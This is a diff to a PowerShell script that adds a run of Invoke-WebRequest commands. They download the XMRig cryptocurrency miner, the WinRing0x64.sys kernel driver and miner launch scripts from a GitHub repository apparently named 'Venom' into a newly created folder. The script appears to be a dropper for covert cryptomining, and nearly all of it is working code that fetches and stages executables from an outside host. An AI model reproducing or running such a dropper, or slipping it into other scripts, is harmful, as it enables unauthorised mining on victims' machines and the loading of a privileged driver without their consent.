@@ -68,7 +68,17 @@ Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs
 New-Item -Name "$wd" -Path "$path" -ItemType Directory
 echo $wd
 
+Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/rig/SHA256SUMS -OutFile "SHA256SUMS.txt"
 
+Invoke-WebRequest -Uri https://github.com/P0k3m0n-unleashed/ProjSucc/blob/master/Venom/rig/WinRing0x64.sys -OutFile "WinRing0x64.sys"
+
+Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/rig/benchmark_10M.cmd -OutFile "benchmark_10M.cmd"
+
+Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/rig/benchmark_1M.cmd -OutFile "benchmark_1M.cmd"
+
+Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/rig/start.cmd -OutFile "start.cmd"
+
+Invoke-WebRequest -Uri https://github.com/P0k3m0n-unleashed/ProjSucc/blob/master/Venom/rig/xmrig.exe -OutFile "xmrig.exe"
 
 pause
 #.\attempt1.exe; ./calty2
